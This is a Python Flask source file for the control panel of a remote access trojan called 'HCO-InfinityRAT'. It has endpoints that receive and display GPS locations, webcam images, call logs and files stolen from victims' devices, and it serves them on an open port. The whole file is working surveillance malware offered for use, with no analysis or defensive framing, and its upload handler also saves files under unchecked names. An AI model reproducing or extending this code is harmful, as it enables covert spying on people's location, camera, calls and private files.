from flask import Flask, request, render_template_string
import os
import base64

app = Flask(__name__)

UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return render_template_string("""
    <h2>📡 HCO-InfinityRAT Control Panel</h2>
    <ul>
        <li><a href='/gps'>📍 View GPS Logs</a></li>
        <li><a href='/webcam'>📷 View Webcam Captures</a></li>
        <li><a href='/files'>📁 Browse Files</a></li>
        <li><a href='/calls'>📞 View Call Logs</a></li>
    </ul>
    """)

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    path = os.path.join(UPLOAD_FOLDER, file.filename)
    file.save(path)
    return 'File received'

@app.route('/gps', methods=['GET', 'POST'])
def gps():
    if request.method == 'POST':
        data = request.form.get('data')
        with open(f"{UPLOAD_FOLDER}/gps.txt", "a") as f:
            f.write(data + "\n")
        return 'GPS Saved'
    else:
        try:
            with open(f"{UPLOAD_FOLDER}/gps.txt") as f:
                content = f.read().replace("\n", "<br>")
        except FileNotFoundError:
            content = "No GPS data."
        return f"<h3>GPS Logs</h3><p>{content}</p>"

@app.route('/webcam', methods=['POST', 'GET'])
def webcam():
    if request.method == 'POST':
        image_data = base64.b64decode(request.form['image'])
        with open(f"{UPLOAD_FOLDER}/webcam.jpg", "wb") as f:
            f.write(image_data)
        return 'Webcam image saved'
    else:
        if os.path.exists(f"{UPLOAD_FOLDER}/webcam.jpg"):
            return '<img src="/static/webcam.jpg">'
        else:
            return 'No webcam image.'

@app.route('/calls', methods=['POST', 'GET'])
def calls():
    if request.method == 'POST':
        call_log = request.form.get('data')
        with open(f"{UPLOAD_FOLDER}/calls.txt", "a") as f:
            f.write(call_log + "\n")
        return 'Call logs received'
    else:
        try:
            with open(f"{UPLOAD_FOLDER}/calls.txt") as f:
                logs = f.read().replace("\n", "<br>")
        except FileNotFoundError:
            logs = "No call logs yet."
        return f"<h3>Call Logs</h3><p>{logs}</p>"

@app.route('/files', methods=['GET'])
def files():
    try:
        files = os.listdir(UPLOAD_FOLDER)
        return "<h3>Uploaded Files</h3>" + "<br>".join(files)
    except Exception as e:
        return f"Error: {e}"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=22533)
